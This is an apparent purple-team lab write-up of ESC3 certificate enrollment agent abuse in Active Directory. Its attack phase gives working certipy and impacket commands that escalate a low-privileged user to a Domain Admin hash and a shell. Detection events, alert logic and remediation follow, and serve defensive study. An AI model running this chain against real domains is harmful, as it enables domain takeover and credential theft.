# ESC3: Enrollment Agent Abuse - Complete Attack Chain

## Attack Overview

ESC3 exploits misconfigured certificate templates that allow enrollment agents to request certificates on behalf of other users without proper approval workflows. The attack chains enrollment agent privileges with PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) to achieve domain compromise.

---

## Phase 1: DC Configuration (Deliberate Misconfiguration)

### Template 1: VulnEnrollmentAgent

**Purpose:** Allow low-privileged user to obtain an enrollment agent certificate

**Configuration Steps:**

1. Open Certificate Templates console:
   ```powershell
   certtmpl.msc
   ```

2. Duplicate the "Enrollment Agent" template:
   - Right-click "Enrollment Agent" → Duplicate Template

3. **General tab:**
   - Template display name: `VulnEnrollmentAgent`
   - Template name: `VulnEnrollmentAgent`

4. **Security tab:**
   - Click "Add"
   - Add user: `lowpriv`
   - Grant permissions:
     - ☑ Enroll
     - ☑ Autoenroll

5. **Issuance Requirements tab:**
   - ☐ Uncheck "CA certificate manager approval" (CRITICAL MISCONFIGURATION)
   - Authorized signatures required: 0

6. Click "Apply" → "OK"

7. **Publish the template:**
   ```powershell
   # Open Certification Authority console
   certsrv.msc
   
   # Right-click "Certificate Templates" → New → Certificate Template to Issue
   # Select "VulnEnrollmentAgent" → OK
   ```

---

### Template 2: VulnUser

**Purpose:** Allow enrollment agent certificates to request certificates on behalf of other users

**Configuration Steps:**

1. In Certificate Templates console:
   ```powershell
   certtmpl.msc
   ```

2. Duplicate the "User" template:
   - Right-click "User" → Duplicate Template

3. **General tab:**
   - Template display name: `VulnUser`
   - Template name: `VulnUser`
   - Validity period: 1 year

4. **Request Handling tab:**
   - Purpose: Signature and encryption (default)

5. **Subject Name tab:**
   - ☑ Build from this Active Directory information (default)
   - ☐ **Uncheck "Include e-mail name in subject name"** (prevents email requirement error)
   - Subject name format: Common name
   - Include this information in alternate subject name:
     - ☑ User principal name
     - ☐ **Uncheck "E-mail name"** (CRITICAL - prevents 0x80094812 error)

6. **Issuance Requirements tab:**
   - ☑ **Check "This number of authorized signatures: 1"** (CRITICAL)
   - ☑ **Check "Application policy: Certificate Request Agent"** (CRITICAL)
   - ☐ **Uncheck "CA certificate manager approval"** (CRITICAL MISCONFIGURATION)
   - ☑ **Check "Valid existing certificate"**

7. **Extensions tab:**
   - Verify "Application Policies" includes "Client Authentication"
   - (Should be present by default from User template)

8. **Security tab:**
   - Click "Add"
   - Add user: `lowpriv`
   - Grant permissions:
     - ☑ Enroll
     - ☑ Autoenroll

9. Click "Apply" → "OK"

10. **Publish the template:**
    ```powershell
    # In certsrv.msc
    # Right-click "Certificate Templates" → New → Certificate Template to Issue
    # Select "VulnUser" → OK
    ```

11. **Restart Certificate Services:**
    ```powershell
    Restart-Service CertSvc
    ```

---

## Phase 2: Attack Execution (Attacker Machine)

### Step 1: Enumerate Vulnerable Templates

```bash
certipy find -u lowpriv@172.16.61.137 -p Password123! -dc-ip 172.16.61.137 -vulnerable -stdout
```

**Look for:**
- Template with "Certificate Request Agent" EKU
- User has enrollment rights
- No manager approval required

**Expected Output:**
```
[!] Vulnerabilities
  ESC3: Template has Certificate Request Agent EKU set.
```

---

### Step 2: Request Enrollment Agent Certificate

```bash
certipy req -u lowpriv@172.16.61.137 -p Password123! \
  -ca 'lab2019-WIN-JOCP945SK51-CA' \
  -template 'VulnEnrollmentAgent' \
  -dc-ip 172.16.61.137
```

**What happens:**
- Certipy generates RSA key pair
- Submits Certificate Signing Request (CSR) to CA via RPC
- CA validates that `lowpriv` has Enroll rights on VulnEnrollmentAgent template
- CA issues certificate with Certificate Request Agent EKU
- Certipy saves certificate + private key to `lowpriv.pfx`

**Expected Output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'lowpriv@lab2019.local'
[*] Saving certificate and private key to 'lowpriv.pfx'
```

---

### Step 3: Request Certificate On Behalf Of Domain Admin

```bash
certipy req -u lowpriv@172.16.61.137 -p Password123! \
  -ca 'lab2019-WIN-JOCP945SK51-CA' \
  -template 'VulnUser' \
  -on-behalf-of 'lab2019\administrator' \
  -pfx lowpriv.pfx \
  -dc-ip 172.16.61.137
```

**What happens:**
1. Certipy loads enrollment agent certificate from `lowpriv.pfx`
2. Generates new CSR with Subject: `CN=Administrator`
3. **Signs the CSR with enrollment agent private key** (proving authority to request on behalf of others)
4. Submits signed CSR to CA
5. CA validates:
   - CSR signature matches enrollment agent certificate
   - Enrollment agent cert has Certificate Request Agent EKU
   - VulnUser template allows enrollment agent signatures (authorized signatures = 1)
   - VulnUser template has Application Policy: Certificate Request Agent
6. CA issues certificate with Subject: Administrator
7. Certipy saves to `administrator.pfx`

**Expected Output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@lab2019.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

---

### Step 4: PKINIT Authentication (Kerberos via Certificate)

```bash
certipy auth -pfx administrator.pfx -dc-ip 172.16.61.137
```

**What happens (PKINIT/Kerberos flow):**

1. **Certipy parses certificate:**
   - Extracts UPN: `administrator@lab2019.local`
   - Extracts SID: `S-1-5-21-...-500`
   - Identifies principal for Kerberos

2. **PKINIT Pre-Authentication (AS-REQ):**
   - Certipy constructs Kerberos AS-REQ (Authentication Service Request)
   - **Instead of using password hash, uses certificate for pre-authentication**
   - Includes:
     - Client principal: `administrator@lab2019.local`
     - **PA-PK-AS-REQ** structure containing:
       - Client's certificate (administrator.pfx)
       - Signed authenticator proving possession of private key
       - Diffie-Hellman parameters for session key exchange

3. **KDC validates certificate (AS-REP):**
   - DC/KDC receives AS-REQ with PKINIT data
   - Validates certificate chain against trusted CA (lab2019-WIN-JOCP945SK51-CA)
   - Verifies certificate UPN matches requested principal
   - Verifies certificate is valid (not expired, not revoked)
   - **Maps certificate SID to Administrator account**
   - Generates TGT (Ticket Granting Ticket) encrypted with krbtgt hash
   - Returns TGT in AS-REP

4. **Certipy extracts credentials:**
   - Saves TGT to `administrator.ccache`
   - **Uses U2U (User-to-User) or S4U2Self to extract NT hash**
   - Requests service ticket to itself using TGT
   - Decrypts ticket with certificate private key
   - Extracts NT hash: `aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f`

**Expected Output:**
```
[*] Using principal: 'administrator@lab2019.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab2019.local': aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f
```

---

### Step 5: Domain Compromise via Pass-the-Hash

```bash
impacket-wmiexec administrator@172.16.61.137 -hashes :3c02b6b6fb6b3b17242dc33a31bc011f
```

**What happens:**
- Impacket authenticates using NTLM hash (no password needed)
- Spawns WMI process as SYSTEM on DC
- Interactive shell as Domain Admin

**Expected Output:**
```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
lab2019\administrator
```

---

## Phase 3: Detection (Purple Team Perspective)

### Event ID 4886: Certificate Request Received (Request 5)

**Location:** DC Security Event Log

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4886} | 
  Where-Object {$_.Properties[3].Value -eq 5}
```

**Event Details:**
```
Request ID: 5
Requester: LAB2019\lowpriv
Subject from CSR: CN=lowpriv
Requested Template: VulnEnrollmentAgent
```

**Analysis:** Normal certificate request - requester matches subject.

---

### Event ID 4887: Certificate Issued (Request 5)

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4887} | 
  Where-Object {$_.Properties[3].Value -eq 5}
```

**Event Details:**
```
Request ID: 5
Subject: CN=lowpriv
Template: VulnEnrollmentAgent
Certificate Attributes: Certificate Request Agent EKU
```

**Analysis:** Enrollment agent certificate issued to low-privileged user.

---

### Event ID 4886: Certificate Request Received (Request 11) **← SMOKING GUN**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4886} | 
  Where-Object {$_.Properties[3].Value -eq 11}
```

**Event Details:**
```
Request ID: 11
Requester: LAB2019\lowpriv              ← Low-priv user
Subject from CSR: CN=Administrator      ← Requesting DA cert
Requested Template: VulnUser
Authentication Service: NTLM
```

**Detection Signature:**
```
IF (Requester != Subject) 
AND (Template allows enrollment agent signatures)
AND (Requester NOT IN privileged groups)
THEN Alert: ESC3 Enrollment Agent Abuse
```

---

### Event ID 4887: Certificate Issued (Request 11)

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4887} | 
  Where-Object {$_.Properties[3].Value -eq 11}
```

**Event Details:**
```
Request ID: 11
Subject: CN=Administrator
Template: VulnUser
Issued to: LAB2019\lowpriv (via enrollment agent)
```

---

### Event ID 4768: Kerberos TGT Request (PKINIT)

**Location:** DC Security Event Log

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768} | 
  Where-Object {$_.Message -match "administrator" -and $_.Message -match "0x10"}
```

**Event Details:**
```
Account Name: administrator@LAB2019.LOCAL
Service Name: krbtgt/LAB2019.LOCAL
Pre-Authentication Type: 0x10 (Public Key)  ← PKINIT indicator
Result Code: 0x0 (Success)
Certificate Issuer: lab2019-WIN-JOCP945SK51-CA
Certificate Serial Number: <serial>
```

**Detection Signature:**
```
IF (Pre-Authentication Type == 0x10)  # PKINIT
AND (Account is privileged)
AND (No recent password change)
THEN Alert: Potential certificate-based compromise
```

---

## Key Misconfigurations Exploited

1. **VulnEnrollmentAgent template:**
   - Enrollment agent EKU granted to non-privileged user
   - No manager approval required

2. **VulnUser template:**
   - Accepts enrollment agent signatures (`authorized signatures: 1`)
   - Application policy allows Certificate Request Agent
   - No manager approval required
   - Low-privileged user has enrollment rights

3. **PKINIT enabled by default:**
   - Domain controllers accept certificate-based authentication
   - No additional controls on certificate-to-account mapping

---

## Why ESC3 is Loud (Detection Perspective)

**Trivial detection indicators:**
- Requester ≠ Subject in Event 4886/4887
- Non-privileged user obtaining enrollment agent certificate
- PKINIT authentication for privileged account without recent cert enrollment
- Certificate serial number mismatch with expected admin certificates

**Survival time in monitored environment:** ~30 seconds

**Stealth improvement requires:**
- Compromised enrollment agent service account (legitimate requester/subject match)
- Or: Legitimate HR/helpdesk workflow abuse (social engineering)

---

## PKINIT Technical Deep Dive

### Why Certificates Enable Domain Compromise

**Traditional Kerberos (password-based):**
1. User provides password
2. DC hashes password with salt
3. Resulting key encrypts pre-authentication data
4. DC validates by recomputing hash from stored password

**PKINIT (certificate-based):**
1. User provides certificate + proves possession of private key
2. DC validates certificate against trusted CA
3. **DC maps certificate to user account (via UPN or SID)**
4. DC issues TGT without ever checking password
5. **Certificate private key allows extracting NT hash via U2U**

**Attack advantage:**
- Certificates bypass password validation entirely
- No alerts from unusual authentication patterns (different IP, time, etc.)
- Certificate validity outlasts password changes
- Hash extraction provides persistent access

---

## Remediation

**Immediate:**
1. Delete VulnEnrollmentAgent and VulnUser templates
2. Audit all templates with Certificate Request Agent EKU
3. Review enrollment agent certificate holders

**Long-term:**
1. **Require manager approval** for all enrollment agent templates
2. **Restrict enrollment rights** on enrollment agent templates to HR/helpdesk only
3. **Enable certificate revocation checking** (CRL/OCSP)
4. **Implement CA auditing** with SIEM integration
5. **Deploy detection rules** for requester/subject mismatch
6. **Monitor PKINIT authentications** for privileged accounts

---

## References

- **SpecterOps Certified Pre-Owned:** https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **Certipy Documentation:** https://github.com/ly4k/Certipy
- **Microsoft PKINIT:** https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-allow-pku2u-authentication-requests
- **Event ID 4886/4887:** https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/

---

**Lab Environment:**
- Domain: lab2019.local
- DC: WIN-JOCP945SK51.lab2019.local (172.16.61.137)
- CA: lab2019-WIN-JOCP945SK51-CA
- Attacker: Kali Linux
- Low-priv user: lowpriv / Password123!
- Target: Administrator

**Attack completed:** 2026-02-13
**Detection assessment:** Highly visible (requester/subject mismatch)
**Purple team conclusion:** ESC3 demonstrates why enrollment agent privileges require strict access controls and approval workflows.
